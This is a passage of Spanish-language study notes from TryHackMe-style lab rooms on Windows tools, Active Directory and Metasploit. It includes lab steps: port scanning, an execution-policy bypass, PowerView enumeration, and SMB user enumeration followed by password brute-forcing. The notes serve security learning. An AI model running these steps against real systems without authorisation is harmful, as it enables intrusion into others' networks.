- *Task Scheduler*: Con esta herramienta podemos programar la ejecución de una tarea.

- *Event Viewer*: Nos permite acceder al registro de eventos. Existen 5 tipos de eventos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183757.png' | relative_url }}" text-align="center"/>
</div>

Y cuatro tipos de logs:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183758.png' | relative_url }}" text-align="center"/>
</div>

- *Shared Folder*: Un listado completo de todas las carpetas compartidas a otros usuarios.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183759.png' | relative_url }}" text-align="center"/>
</div>

- *Local Users and Grupos*: Nos lleva al archivo "lusrmgr.msc" ya visto en la sección anterior.

- *Perfomance*: Tenemos acceso al Perfomance Monitor (perfom).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183760.png' | relative_url }}" text-align="center"/>
</div>

- *Storage*: En Storage podemos encontrar una interfaz que nos guía a lo largo del manejo del disco duro:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183761.png' | relative_url }}" text-align="center"/>
</div>

En esta interfaz podemos crear un nuevo espacio, extender una partición, partir una partición o asignar una letra a una parte del espacio vacío.

- *Services & Applications*: Aplicaciones y servicios.

<br />

**System Information**

Windows contiene una herramienta denominada Microsoft System Information (Msinfo32.exe) que recopila información sobre el ordenador y despliega una vista comprensible del hardware, componentes del sistema, entorno del software que puede ser empleado para detectar problemas del ordenador.

La información se divide en tres secciones principalmente:

- Harware Resources.
- Components: Información específica de dispositivos instalados en el sistema.
- Software Enviroment: Variables de entorno y Network.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183762.png' | relative_url }}" text-align="center"/>
</div>

Particularmente importante es la última sección:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183763.png' | relative_url }}" text-align="center"/>
</div>

Y la sección de Network:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183764.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Resource Monitor**

Resource Monitor muestra información de uso de CPU, memoria, disco y red por proceso y agregada, además de proporcionar detalles sobre qué procesos están utilizando identificadores de archivos y módulos individuales. El filtrado avanzado permite a los usuarios aislar los datos relacionados con uno o más procesos (ya sean aplicaciones o servicios), iniciar, detener, pausar y reanudar servicios y cerrar aplicaciones que no responden desde la interfaz de usuario. También incluye una función de análisis de procesos que puede ayudar a identificar procesos bloqueados y conflictos de bloqueo de archivos para que el usuario pueda intentar resolver el conflicto en lugar de cerrar una aplicación y perder datos potencialmente.

Existen cuatro pestañas fundamentalmente:

- CPU
- Disk
- Network
- Memory

<br />

**cmd**

La **cmd** es la terminal de Windows. Existen algunos comandos importantes como:

|nombre|descripción|
|-|-|
|hostname|Despliega el nombre de la computadora.|
|whoami|El nombre del usaurio logeado.|
|ipconfig|Despliga información de red.|
|/?|Despliega información del manual del comando precedente. Por ejemplo: ipconfig /?|
|cls|Clear.|
|netstat|Información de red en TCP/IP. Admite parámetros: -a, -b, -e.|
|net|Opciones de red.|

<br />

**Registry Editor**

El Windows Registry es una base de datos jerarquica empleada para almacenar información necesaria para configurar el sistema para uno o más usuarios, aplicaciones, hardware, etc.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220707183765.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 5.3. Active Directory Basics.

**Introducción a Active Directory**

Active Directory, AD o Directorio Activo, es una herramienta perteneciente a la empresa Microsoft para proporcionar servicios de directorio en una red LAN.

Concretamente, *AD proporciona un servicio ubicado en uno (o varios) servidores capaz de crear objetos como usuarios, equipos o grupos para administrar las credenciales de los equipos que se conectan a una red o directamente gestionar las políticas de comportamiento de la misma (gestión de permisos, bandejas de correo, etc)*.

A grandes rasgos se puede decir que Active Directory es una base de datos, concretamente es una *Multi-Master Distributed Database* es decir, es una base de datos almacenada en distintos dispositivos sobre la que se puede hacer cambios en la mayoría de las instancias (los cambios que se hacen en una localización se actualiza al resto de dispositivos). En esta base de datos se almacenan datos relacionados con usuarios, grupos de seguridad, maquinas, etc.

<br />

**Como funciona Active Directory**

Los protocolos mas utilizados por AD son: LDAP, DHCP, KERBEROS y DNS:

- *LDAP*: Responde a Lightweigth Directory Access Protocol, gestiona el acceso a servicios de directorio.

- *DHCP*: Responde a Dynamic Host Configuration Protocol y es un protocolo empleado para asiganar a un dispositivo una dirección IP.

- *KERBEROS*: Se trata de un protocolo de autenticación de peticiones de servicios entre un host confiable y una red no fiable (como Internet).

- *DNS*: DNS es un protocolo que asigna un dominio concreto (un nombre) a una dirección IP.

De esta forma y con la ayuda de los protocolos anteriores AD actúa como una especie de base de datos que almacena información en tiempo real sobre la autenticación de usuarios dentro de una red y haciendo que todos los dispositivos estén sincronizados bajo un elemento central, el Domain Controller.

Por ejemplo, supongámos que en un servidor de AD tenemos un objeto usuario compuesto por los típicos atributos: Nombre, Apellidos, etc. Este usuario a su vez pertenece a un grupo por el que se le conceden determinados niveles de privilegios. El equipo cliente se conecta con el servidor y debe autenticarse, cuando se autentica se carga la información relativa al usuario en el equipo cliente desde el servidor.

<br />

**Conceptos importantes en Active Directory**

A continuación vamos a definir un conjunto de términos con los que trabajeremos a la hora de describir técnicamente cómo funciona Active Directory:


- *Unidad Organizativa*: Contenedor de objetos del mismo tipo. Varias unidades suelen conforman el cuerpo de un dominio.

- *Dominio*: En AD, un Dominio es un conjunto de ordenadores conectados a una red que disponen de un servidor que actúa con el rol de gestor de credenciales. Este servidor recibe el nombre de *Domain Controller* o controlador de dominio y está caracterizado por un nombre.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220724175052.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Tree*: Un árbol es un conjunto de dominios que penden de una raíz común y están organizados con una determinanda jerarquía.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220724175101.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Bosque*: Es el nivel de organización más alto que existe en AD y contiene a todos los dominios de una red de Active Directory.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220724175540.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Trust*: Las relaciones entre dos dominios; como compartir recursos, etc se denominan como *relaciones de confianza* o *trust*. Las relacionaes de confianza son de dos tipos:

- *Confianza Directa*: Una confianza explícita entre dos dominios, uno de confianza al que se concede acceso a otro dominio.

- *Confianza Transitiva*: Es una confianza explícita entre dos dominios que es a su vez y en contraste con la anterior, recíproca entre ambos dominios.

<br />

- *Objeto*: Un objeto es un nombre genérico que se emplea para referirse a cualquier componente dentro de un directorio. Los objetos se dividen en tres tipos distintos:

- *Usuarios*: Entendidos como las credenciales de acceso a las estaciones de trabajo almacenadas en el servidor.
- *Recursos*: Son los elementos a los que distintos usuarios tienen acceso en función de sus permisos.
- *Servicios*: Son las funcionalidades a las que cada usuario puede acceder (correo, impresoras, etc.)

<br />

**Controladores de Dominio. Almacén de datos AD DS.**

Hemos hablado de que en esencia, Active Directory es un mecanismo de gestión de un grupo de máquinas conectadas a una central, esta máquina central recibe el nombre de *Domain Controllery* y actúa bajo el rol de gestor de los recursos del dominio a los que distintos objetos del mismo quieren acceder.

Un controlador de dominio se encarga de:

- Guardar el almacén de datos del AD DS.
- Maneja la autenticación y autorización de servicios.
- Replica las actualizaciones de otros controladores de domino que se encuentren distribuidos por la red.
- Permite a los administradores manejar recursos del dominio.

Se trata de una máquina Windows Server que tiene el Active Directory Domain Services (AD DS) instalado y contiene el *AD DS Data Store* que es donde se guardan las bases de datos y procesos necesarios para almacenar y administrar la información del directorio como usuarios, grupos y servicios.

Algunos de los contenidos y características son:

- *NTDS.dit*: Una base de datos que contiene toda la información de un controlador de dominios de Active Directory así como los hashes de contraseña.

- El AD DS está almacenada por defecto en %SystemRoot%\\NTDS

- Sólo es accesible desde un controlador de dominos.

<br />

De esta forma y en términos muy simples la red de Active Directory se extiene por todos y cada uno de los dispositivos incorporados en una red concreta. Hay una pieza física fundamental, el controlador de dominios, el cual es un Servidor Windows que tiene instalado el AD DS que es la herramienta que le permite llevar a cabo una gestión de todo lo referente a Active Directory gracias entre otras cosas al AD DS Data Store que se trata de una base de datos embebida dentro del propio servidor que contiene las bases de datos y procesos necesarios para desempeñar la gestión adecuadamente.

<br />

**AD Forest**

Un Active Directory Forest o AD Forest es el nivel de organización más alto dentro de Active Directory. Cada bosque comparte una única base de datos, una única lista global de direcciones y un límite de seguridad. De forma predeterminada, un usuario o administrador de un AD Forest no puede acceder a otro AD Forest.

De una forma menos técnica, un AD Forest es una colección de uno o más dominios dentro de una red de Active Directory.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220721184109.png' | relative_url }}" text-align="center"/>
</div>

A su vez, un "forest" consiste en las siguientes partes que veremos en partes ulteriores con más detalles:

- *Trees*: Una subjerarquía de dominios en el AD DS.
- *Domain*: Un nombre sobre el que se agrupa un conjunto de objetos dirigidos desde un Domain Controller.
- *Organizational Units*: También conocidas como OUs, son contenedores de grupos, ordenadores, usuarios, impresoras...
- *Trusts*: Permisos que permiten a los usuarios acceder a recursos en otros dominios.
- *Objects*: Usuarios, grupos, maquinas, recursos compartidos (shares).
- *Domain Services*: DNS Server, LLMNR, IPv6.
- *Domain Schema*: Reglas para la creación de objetos.

<br />

**Users + Groups**

Los usuarios y los grupos que existen dentro de Active Directory se crean desde el Domain Controller. Este aparece con grupos y usuarios por defecto: Administrator y Guest. A partir de ahí, los usuarios y grupos adicionales necesitan ser creados por una entidad con permisos suficientes.

Existen cuatro tipos de usuarios en Active Directory:

- *Domain Admins*: Son los únicos que tienen acceso al controlador de Dominio y además juegan con el rol de administrador.
- *Service Accounts*: (Pueden ser Domain Admins). Estos en gran medida sólo aparecen para cuestiones de mantenimiento u otras gestiones relacionadas con la misma temática.
- *Local Administrators*: Estos usuarios poseen un rol de administrador sobre una máquina pero no tienen acceso al Domain Controller.
- *Domain Users*: El usuario común, sus privilegios dependerá de la configuración que depende de cada contexto.

<br />

Con respecto a los grupos existen dos tipos de grupos en Active Directory:

- *Security Groups*: Son grupos que se utilizan para especificar permisos a un conjunto amplio de usuarios.
- *Distribution Groups*: Estos grupos se emplean para especificar listas de distribución de emails. Para un atacante estos grupos pueden ser benficioso desde el punto de vista de la enumeración.

Algunos de los grupos de seguridad que están por defecto son:

- Domain Controllers - All domain controllers in the domain
- Domain Guests - All domain guests
- Domain Users - All domain users
- Domain Computers - All workstations and servers joined to the domain
- Domain Admins - Designated administrators of the domain
- Enterprise Admins - Designated administrators of the enterprise
- Schema Admins - Designated administrators of the schema
- DNS Admins - DNS Administrators Group
- DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
- Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
- Group Policy Creator Owners - Members in this group can modify group policy for the domain
- Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
- Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
- Cert Publishers - Members of this group are permitted to publish certificates to the directory
- Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
- Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
- Key Admins - Members of this group can perform administrative actions on key objects within the domain.
- Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
- Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
- RAS and IAS Servers - Servers in this group can access remote access properties of users.

<br />

**Trust + Policies**

Los *trusts* son mecanismos que actúan como fideicomisos (un documento que deposita confianza sobre otro individuo para perpetrar ciertas acciones) sobre los usuarios de la red para que puedan acceder a otros recursos de un dominio. Son un mecanismo por el que se esboza la forma en la que dominios dentro de un AD Forest se comunican entre sí y en algunos casos como el AD Forest se comunica con dominios externos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220723174457.png' | relative_url }}" text-align="center"/>
</div>

Existen dos tipos de trust que pueden determinar como los dominios se comunican entre sí:

- *Direccional*: Los trust pueden ser direccionales en el sentido de que especifican la dirección del acceso entre dos dominios.
- *Transitive*: La relación de confianza se expande más allá de dos dominios para incluir a otros dominios de confianza.

De esta forma a través de los Trust se establecen las relaciones entre dominios por las cuales estos se pasan datos entre dominios e incluso entre forest.

<br />

Por otra parte las *policies* o políticas dictan cómo se comporta el servidor. Se puede entender una política como un conjunto de reglas que se aplican a un dominio concreto.

<br />

**Active Directory Domain Services + Domain Authentication**

El *Domain Services* son un conjunto de servicios que el controlador de dominios proporciona al resto de dominios o directamente a un tree (recordemos; una estructura de dominios jerarquizada). Los Domain Services por defecto son:

- *LDAP*: Lightweight Directory Access Protocol; provee comunicación entre aplicaciones y directory services.
- *Certificate Services*: Permite al controlador de dominios crear, validar y revocar certificados de clave.
- *DNS, LLMNR, NBT-NS*: Domain Services que permiten identificar IP hostnames.

<br />

La parte más importante de Active Directory (y a su vez la parte más vulnerable) son los protocolos de autenticación.

Existen dos tipos fundamentales de autenticación en Active Directory:

- *Kerberos*: El servicio de autenticación predeterminado para Active Directory utiliza "tickets" de otorgamiento de "tickets" y vales de servicio para autenticar a los usuarios y darles acceso a otros recursos en todo el dominio.

- *NTLM*: El protocolo de autenticación predeterminado de Windows utiliza un protocolo de desafío/respuesta cifrado.

<br />

Los servicios de dominio de Active Directory son el principal punto de acceso para los atacantes y contienen algunos de los protocolos más vulnerables.

<br />

**AD in the Cloud**

Aunque toda la estructura de Active Directory está diseñada para un entorno material, con dispositivos físicos integrados en una estructura de red, recientemente ha habido un cambio para adaptar el AD a redes cloud.

El provedor más notable de AD Cloud es Azure AD,

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220724104718.png' | relative_url }}" text-align="center"/>
</div>

su configuración por defecto es mucho más segura que la configuración de otras redes AD físicas aunque sigue teniendo vulnerabilidades.

La forma de actuación que tiene Azure AD es ser el agente que comunica un Active Directory físico con las interacciones de los clientes que interactúan con un Domain Controller de dicho forest de Active Directory.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220724104658.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Hands-On Lab**

Vamos a explorar un Active Directory Server con las credenciales de un administrador.

En primer lugar y con tanto la máquina Kali como con el Windows Server activo, comprobamos que tenemos conectividad y llevamos a cabo un escaneo TCP de todos los puertos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220725105848.png' | relative_url }}" text-align="center"/>
</div>

<br />

```bash
nmap 10.10.53.226 -sT -p- -vv -T5
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220725105919.png' | relative_url }}" text-align="center"/>
</div>

Como tiene el puerto SSH abierto y poseemos las credenciales administrator:password123@ procedemos a logearnos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220725110117.png' | relative_url }}" text-align="center"/>
</div>

Hasta aqui tendríamos abierta una cmd como el administrador, pero queremos abrir una shell en PowerShell, para ello empleamos el siguiente comando:

```cmd
powershell -ep bypass
```

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220725110533.png' | relative_url }}" text-align="center"/>
</div>

Y cargamos el modulo PowerView con el comando:

```bash
. .\PowerView.ps1
```

A partir de aquí, procedemos a recopilar información del sistema con los distintos comandos:

- *Nombre del sistema operativo*:

```bash
Get-NetComputer -fulldata | select operatingsystem
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220725111143.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Nombre de la otra cuenta con privilegios de administrador*:

```bash
Get-NetUser | select cn
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220725111343.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Listar los grupos del dominio*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220725111949.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Preferencias de configuración de un servicio*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220725112036.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 5.4. Metasploit: Introduction.

*Metasploit* es un marco de explotación que posee herramientas y módulos que pueden ser muy útiles en todas las etapas de explotación de un penetration testing, desde recopilación de información hasta post-explotación.

Existen dos versiones fundamentales:

- *Metasploit Pro*: Se trata de la versión comercial que características de automatización y manejo de tareas además de un GUI (Graphical User Interface).

- *Metasploit Framework*: La versión "open-source" que funciona mediante línea de comandos. Nos concentraremos en esta versión de Metasploit.

Contiene herramientas de enumeración, recopilación de información, escaneo, explotación, desarrollo de exploits, post-explotación, etc. Los siguientes componentes principales son:

- *Msfconsole*: La herramienta de línea de comandos.
- *Modulos*: Tipos de operaciones que Msfconsole puede llevar a cabo y que cubren un amplio abanico de posibilidades.
- *Tools*: Herramientas autónomas que pueden ayudar en distintas acciones como el escaneo de puertos, escaneo de vulnerabilidades, etc.

<br />

**Principales componentes de Metasploit**

Para utilizar Metasploit Framework es necesario interactuar con *msfconsole* mediante la línea de comandos. Esta es la principal de interfaz entre el usuario y la herramienta Metasploit.

Por eso, antes de comenzar a ver algunos modulos, es conveniente famirializarse con msfconsole y en concreto con algunos conceptos recurrentes:

- *Debilidad*: Fallo de configuración de un dispositivo.
- *Vulnerabilidad*: Debilidad explotable. Es decir, es un fallo de configuración que puede permitir a un atacante aprovecharse de la funcionalidad de un dispositivo.
- *Exploit*: Mecanismo por el que se saca partido de una vulnerabilidad.
- *Payload*: Parte del exploit que contiene la carga maliciosa que hace que el dispositivo se comporte de forma anormal o directamente maliciosa acorde con las intenciones del atacante.

Ahora, pasemos a los distintos tipos de modulos:

- *Auxiliary*: Son modulos de soporte que añaden funcionalidades a Metasploit basándose en herramientas externas, como escaneo de puertos, vulnerabilidades, fuzzers, snifers, etc.

- *Encoders*: Modulos que codifican el exploit o el payload con la esperanza de que un sistema de detección de malware (antivirus) no los detecte. Esto se basa en que generalmente, los antivirus poseen una base de datos con ficheros pertenecientes a distintas clases de malware. Estos ficheros se comparan con uno sospechoso y si existe un match se califica al fichero en cuestión como malware.

- *Evasion*: Modulos que evitan los antivirus por otras vías distintas a la codificación.

- *Exploits*: Distintos fragmentos de código que pueden servir para explotar distintas vulnerbilidades conocidas.

- *NOPs*: No OPeration, no hacen nada literalmente.

- *Payloads*: Distintos payloads que dependerán del tipo de vulnerabilidad y tipo de exploit para conseguir un resultado concreto: enumeración, recuperación de contraseñas, cifrado del sistema, reverse_shell. etc. En Metasploit existen distintos tipos de payloads:

- *Singles*: Se trata de payloads que no necesitan de componentes adicionales para ejecutarse correctamente, se dice que son "autocontenidos".

- *Stagers*: Responsables de crear una conexión entre Metasploit y la máquina víctima. Estos generalmente se emplean con "staged" payloads, que necesitan de una descarga de componentes adicionales.

- *Stages*: Son payloads descargados por el stager, se introducen parcialmente en la máquina víctima y una vez dentro se decargan por completo. Esto permite al atacante enviar payloads más largos.

- *Post*: Estos modulos son útiles para la etapa de post-explotación del penetration testing. Que es la etapa que tiene lugar cuando se ha abierto una sesión entre el atacante y la máquina víctima por ejemplo mediante una reverse_shell.

<br />

**Msfconsole**

Como ya hemos comentado,*msfconsole* será la interfaz que a través de la cual interactuemos con Metasploit. Para iniciarlo tecleamos "msfconsole" en la terminal de nuestro equipo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726083751.png' | relative_url }}" text-align="center"/>
</div>

Se abre una shell propia de metasploit que contiene sus propios comandos, algunos de los más peculiares son:


- *ls*: lista los contenidos de la carpeta desde la que se lanzó Metasploit.
- *ping*: Para lanzar un "PING" a una máquina objetivo.
- *CTRL+C*: No se trata de un comando en sí mismo, pero aborta cualquier proceso en ejecución.
- *clear*: Limpia el output de comandos anteriores.
- *history*: Muestra el historial de comandos.

Hasta aquí serían comandos soportados por MsfConsole de una terminal normal, los comandos intrínsecos a msfconsole se muestran a continuación:

- *search*: Permite buscar un recurso de Metasploit pasándole un nombre a modo de parámetro. Los recursos asociados a dicho termino se mostrarán en forma de lista enumerada.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726091059.png' | relative_url }}" text-align="center"/>
</div>

Es importante tener en cuenta que los contenidos que se listan con "search" también forman parte de un ranking:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726091403.png' | relative_url }}" text-align="center"/>
</div>
- *use*: Permite utilizar un recurso pasándole el nombre del mismo como parámetro o bien el número correspondiente al recurso si se ha mostrado listado anteriormente.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726090011.png' | relative_url }}" text-align="center"/>
</div>

- *info*: Muestra información sobre un determinado recurso que se ha configurado anteriormente.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726091007.png' | relative_url }}" text-align="center"/>
</div>

- *show*: Muestra un listado de un determinado conjunto de objetos (payloads, options, exploits, etc). Se emplea a menudo para ver las opciones que requiere un modulo que se acaba de cargar antes con "use":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726090214.png' | relative_url }}" text-align="center"/>
</div>

Las opciones suelen ser parámetros a concretar acerca del modulo configurado.

- *set/unset*: "set" se emplea para dar un valor a un parámetro del exploit mediante:

```bash
set <PARAMETER> <VALUE>
```

De la misma forma podemos emplear "unset" para quitar un valor a un parámetro.

Paralelamente, existe el comando *setg/unsetg* para configurar por defecto un valor para todos los modulos.

Por último, un comando muy útil es

- *back*: Este comando nos permite retroceder y dejar de utilizar un módulo cargado y configurado.

- *exploit/run*: Se emplea para lanzar un modulo ya configurado, ambos comandos son equivalentes, de hecho "run" es un alias para "exploit".

Junto con este comando es habitual emplear el modificador '-z' que envía la sesión al background tan pronto como se abre. También se puede hacer de forma manual con *background* o pulsando "CTRL+Z".

- *sessions*: Con este comando se realiza una gestión de las sesiones que tenemos abiertas con otras máquinas víctimas.

Una sesión es la conexión que se produce cuando lanzamos un exploit a otra máquina y tiene éxito.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726102930.png' | relative_url }}" text-align="center"/>
</div>

Con el modificador "-i" decidimos qué sesión abrimos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726103135.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 5.5. Metasploit: Explotation.

En esta sección veremos cómo usar Metasploit para llevar a cabo tareas como escaneo de vulnerabilidades o técnicas de explotación.

**Scanning**

- *Port Scanning*: Metasploit tiene una serie de módulos para realizar un escaneo de puertos abiertos en la máquina víctima y la red. Estos pueden listarse desde msfconsole mediante "search portscan":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726130634.png' | relative_url }}" text-align="center"/>
</div>

La mayoría requiere de la configuración de una serie de opciones:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726130756.png' | relative_url }}" text-align="center"/>
</div>

Aunque también existe la posibilidad de emplear Nmap como una herramienta auxiliar asociado al framework de Metasploit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726132214.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *UDP service Identification*: Metasploit cuenta con el módulo *scanner/discovery/udp_sweep* que ayuda a identificar servicios que empleen el protocolo UDP. No realiza un escaneo extenso pero puede identificar protocolos conocidos como DNS o NetBios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726133012.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Specific Service Scans*: Metasploit ofrece diversos modulos para escanear servicios específicos. Por ejemplo, especialmente importantes son los modulos: *smb_enumshares* y *smb_version* para el servicio SMB, pero también existen modulos para ftp, Netbios, etc.


Veámos ahora un caso práctico para familiarizarnos con las funcionalidades anteriores:

Supongámos que tenemos una máquina abierta con IP: 10.10.154.541. Procedemos a emplear la herramienta metasploit para llevar a cabo un escaneo TCP de puertos en la máquina remota:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726135205.png' | relative_url }}" text-align="center"/>
</div>

Entre los resultados podemos observar que tiene los siguientes puertos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726135253.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, el escaneo ha sido TCP, puede ser que tenga algún servicio importante abierto entre los puertos UDP. Para ello, en lugar de realizar un escaneo UDP que sería demasiado lento empleamos el módulo de metasploit "auxiliary/scanner/discovery/udp_sweep"

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726141209.png' | relative_url }}" text-align="center"/>
</div>

Este lo que hará será no hacer un escaneo completo sino probar los servicios más probables:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726141309.png' | relative_url }}" text-align="center"/>
</div>

Ahora, empleamos la herramienta auxiliar Nmap para llevar a cabo un escaneo profundo de los puertos de la máquina:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726141642.png' | relative_url }}" text-align="center"/>
</div>

Por último, llevamos a cabo una enumeración de usuarios en el SMB Server con el módulo smb_enumusers

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726143159.png' | relative_url }}" text-align="center"/>
</div>

Obtenemos el nombre de usuario "penny" y procedemos a logearnos con la lista de candidatos a contraseñas que proporciona el Room de tryhackme y con el modulo: smb_login

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726143516.png' | relative_url }}" text-align="center"/>
</div>

Definimos las opciones adecuadas y lanzamos el modulo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726143547.png' | relative_url }}" text-align="center"/>
</div>

Obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726143622.png' | relative_url }}" text-align="center"/>
</div>

<br />

**The Metasploit Database**

En un entorno real de penetration testing habrá varios objetivos que asaltar.

Para hacer frente a varios objetivos, Metasploit tiene una base de datos que simplifica la gestión de datos pertenecientes a varios objetivos.

Usualmente, antes de iniciar Metasploit con el comando "msfconsole" sería necesario asegurarse de que la base de datos se ha iniciado correctamente mediante la siguiente secuencia de comandos:

```bash
systemctl start postgresql
```

<br />

```bash
msfdb init
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726173449.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, iniciamos Metasploit con el siguiente comando:

```bash
msfconsole -x db_status
```

- "msfconsole": lanza Metasploit.
- "-x": Al mismo tiempo que se lanza Metasploit se ejecuta un comando.
- "db_status": Nos permite conocer el estado de la conexión de Metasploit a la base de datos.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726173812.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, los datos que almacena la base de datos de Metasploit se dividen en espacios de trabajo, "Workspaces".

Para la gestión de los workspace son útiles los siguientes comandos:

- *workspace*: Muestra el espacio de trabajo actual o lo cambio si le pasamos el nombre de trabajo como parámetro. Acompañado a este comando podemos añadir ciertos modificadores como -a seguido de un nombre para añadir (add) un nuevo espacio de trabajo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726175310.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, al listar los espacios de trabajo, el actual se indica con un \*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726175931.png' | relative_url }}" text-align="center"/>
</div>

Para más ayuda con el comando "workspace" podemos emplear el modificador "-h".

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726181002.png' | relative_url }}" text-align="center"/>
</div>

- *help*: Este comando siempre es muy útil para tener un acceso rápido a todos los comandos de msfconsole y una breve descripción sobre ellos, entre estos comandos referentes a la base de datos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726181213.png' | relative_url }}" text-align="center"/>
</div>

- *db_nmap*: Este es un comando que utiliza la herramienta Nmap para llevar a cano un escaneo de puertos sobre una máquina objetivo con la diferencia de que guarda los resultados entre las distintas tablas del espacio de trabajo.

Se emplea como un nmap convencional:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220726182210.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, la información recopilada se almacena en distintos campos que veremos a continuación: host, services, vulns, loot, notes.


- *Host*: Es una tabla que recoge las direcciones IP de todas las máquinas con las que Metasploit se ha puesto en contacto.
- *Services*: Recoge todas los servicios de las distintas máquinas con las que metasploit se ha puesto en contacto.
- *Vulns*: Recoge todas las vulnerabilidades asociadas a los distintos servicios de las distintas máquinas con las que Metasploit se ha puesto en contacto.
- *Loot*: Lista todo el loot.
- *Notes*: Lista todas las notas.

En cada una de las tablas anteriores se puede aplicar el modificador -h para obtener más ayuda.

<br />

**Vulnerability Scanning**

Metasploit dispone de modulos que pueden detectar algunas vulnerabilidades críticas y conocidas que se denominan como "low hanging fruit".

La mayoría de estos módulos están vinculados a servicios. Por ejemplo, si encontramos un servidor SMB abierto en una máquina, quizá podamos encontrar un modulo asociado al escaneo de vulnerabilidades.

<br />

**Explotation**

La parte de *explotación* del pentesting es el punto en el que penetramos en una máquina mediante un exploit o mecanismo de acción por el que nos aprovechamos de una vulnerabilidad o defecto explotable. Metasploit es concretamente eso: un marco de explotación y el tipo de modulo que más abunda es el "exploit".

